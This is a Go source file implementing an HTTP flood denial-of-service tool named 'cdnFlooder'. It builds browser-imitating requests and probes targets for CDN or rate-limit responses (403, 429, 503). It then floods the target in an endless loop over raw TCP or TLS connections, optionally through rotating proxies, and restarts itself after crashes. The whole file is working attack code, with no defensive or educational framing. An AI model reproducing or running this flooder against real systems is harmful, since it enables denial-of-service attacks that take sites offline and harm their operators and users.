package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

type cdnFlooder struct {
	method string
	domain string
	port string
	path string
	ssl bool
	userAgent string
	accept string
	acceptEncoding string
	acceptLanguage string
	referer string
	cookie string
	connection string
	customHeader string
	proxy bool
	proxyList []string
}

func (f cdnFlooder) CheckCDN() bool {
	if f.ssl {
		defer func() {
			if err := recover(); err != nil {
				fmt.Println(err)
			}
		}()

		conn, err := tls.Dial("tcp", f.domain + ":" + f.port, conf)
		if err != nil {
			return true
		}
		defer conn.Close()
		conn.Write([]byte(f.GeneratePacket()))
		receivedData := make([]byte, 12)
		conn.Read(receivedData)
		if string(receivedData[9:]) == "403" || string(receivedData[9:]) == "503" {
			return false
		} else if string(receivedData[9:]) == "429" {
			return false
		} else {
			return true
		}
	} else {
		defer func() {
			if err := recover(); err != nil {
				fmt.Println(err)
			}
		}()
		conn, err := net.Dial("tcp", f.domain + ":" + f.port)
		if err != nil {
			return true
		}
		defer conn.Close()
		conn.Write([]byte(f.GeneratePacket()))
		receivedData := make([]byte, 12)
		conn.Read(receivedData)
		if string(receivedData[9:]) == "403" || string(receivedData[9:]) == "503" {
			return false
		} else if string(receivedData[9:]) == "429" {
			return false
		} else {
			return true
		}
	}
}

func (f cdnFlooder) GeneratePacket() string {
	var url, packet string
	if f.ssl {
		url = "https://"
	} else {
		url = "http://"
	}
	url += f.domain
	if f.port != "80" && f.port != "443" {
		url += ":" + f.port
	}
	url += f.path
	packet += strings.ToUpper(f.method) + " " + url + " HTTP/1.1\r\n"
	packet += "Host: " + f.domain + "\r\n"
	if f.connection != "" {
		packet += "Connection: " + f.connection + "\r\n"
	}
	if f.userAgent != "" {
		packet += "User-Agent: " + f.userAgent + "\r\n"
	} else {
		packet += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\r\n"
	}
	if f.accept != "" {
		packet += "Accept: " + f.accept + "\r\n"
	} else {
		packet += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
	}
	if f.acceptEncoding != "" {
		packet += "Accept-Encoding: " + f.acceptEncoding + "\r\n"
	} else {
		packet += "Accept-Encoding: gzip, deflate, br\r\n"
	}
	if f.acceptLanguage != "" {
		packet += "Accept-Language: " + f.acceptLanguage + "\r\n"
	} else {
		packet += "Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7,de;q=0.6,ar;q=0.5,pt;q=0.4,ja;q=0.3,fr;q=0.2\r\n"
	}
	if f.cookie != "" {
		packet += "Cookie: " + f.cookie + "\r\n"
	}
	if f.referer != "" {
		packet += "Referer: " + f.referer + "\r\n"
	}
	if f.customHeader != "" {
		packet += f.customHeader
	}
	return packet + "\r\n"
}

func (f cdnFlooder) Run(running *bool, ready *bool, packet []byte) {
	defer func() {
		if err := recover(); err != nil {
			fmt.Println(err)
			f.Run(running, ready, packet)
		}
	}()
	var s net.Conn
	var err error
	for !*ready {
		time.Sleep(time.Millisecond * 100)
	}
	var i int
	if f.proxy {
		i = rand.Intn(len(f.proxyList))
	}
	for *running {
		if f.proxy {
			s, err = net.Dial("tcp", f.proxyList[i])
		} else if f.ssl {
			s, err = tls.Dial("tcp", f.domain + ":" + f.port, conf)
		} else {
			s, err = net.Dial("tcp", f.domain + ":" + f.port)
		}
		if err != nil {
			if f.proxy {
				f.proxyList = remove(f.proxyList, i)
				i = rand.Intn(len(f.proxyList))
			}
			continue
		} else {
			for i := 0; i < 10; i++ {
				s.Write(packet)
			}
			s.Close()
		}
	}
}

func remove(s []string, i int) []string {
	s[i] = s[len(s)-1]
	// We do not need to put s[i] at the end, as it will be discarded anyway
	return s[:len(s)-1]
}